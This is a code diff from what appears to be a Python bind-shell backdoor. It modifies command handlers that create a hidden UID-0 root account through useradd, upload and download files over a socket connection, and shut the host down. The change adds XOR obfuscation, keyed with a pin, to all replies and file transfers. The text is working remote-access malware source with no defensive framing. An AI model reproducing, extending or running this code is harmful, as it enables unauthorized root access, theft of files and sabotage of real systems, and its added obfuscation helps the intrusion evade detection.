@@ -687,33 +687,33 @@ def bindShell():
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
-            conn.send("[+] Root account " + acct + " has been created.")   
+            conn.send(xor("[+] Root account " + acct + " has been created.", pin))   
         elif cmd2.startswith('upload'):
-            data = conn.recv(1024)
-            strip = data.split(" ")
-            (filepath, filename) = os.path.split(strip)
-            data = conn.recv(1024)
-            filewrite=file(filename, "wb")
-            filewrite.write(data)
-            filewrite.close()
+            getname = cmd2.split(" ")
+            rem_file = getname[1]
+            filename = rem_file.replace("/","_")
+            data = conn.recv(socksize)
+            filedata = xor(data, pin)
+            newfile = file(filename, "wb")
+            newfile.write(filedata)
+            newfile.close()
             if os.path.isfile(filename):
-                conn.send("[+] File upload complete!")
+                conn.send(xor("[+] File upload complete!", pin))
             if not os.path.isfile(filename):
-                conn.send("[!] File upload failed! Please try again")
+                conn.send(xor("[!] File upload failed! Please try again", pin))
         elif cmd2.startswith('download'):
-            data = conn.recv(1024)
-            strip = cmd.split(" ")
-            filename = strip[1]
-            if not os.path.isfile(filename):
-                conn.send("[!] File not found on host! Check the filename and try again.")
-            if os.path.isfile(filename):
-                fileopen=file(filename, "rb")
-                file_data=""
-                for data in fileopen:
-                    file_data += data
-                    conn.sendall(file_data)
+            getname = cmd2.split(" ")
+            loc_file = getname[1]
+            if os.path.exists(loc_file) is True:
+                sendfile = open(loc_file, "r")
+                filedata = sendfile.read()
+                sendfile.close()
+                senddata = xor(filedata, pin)
+                conn.sendall(senddata)
+            else:
+                conn.send(xor("[+] File not found!", pin))
         elif cmd2.startswith("rebootsys"):
-            conn.send("[!] Server system is going down for a reboot!")
+            conn.send(xor("[!] Server system is going down for a reboot!", pin))
             os.system("shutdown -h now")
         elif cmd2 == ("extask"):
             conn.send(xor("   extask help menu    \n", pin))
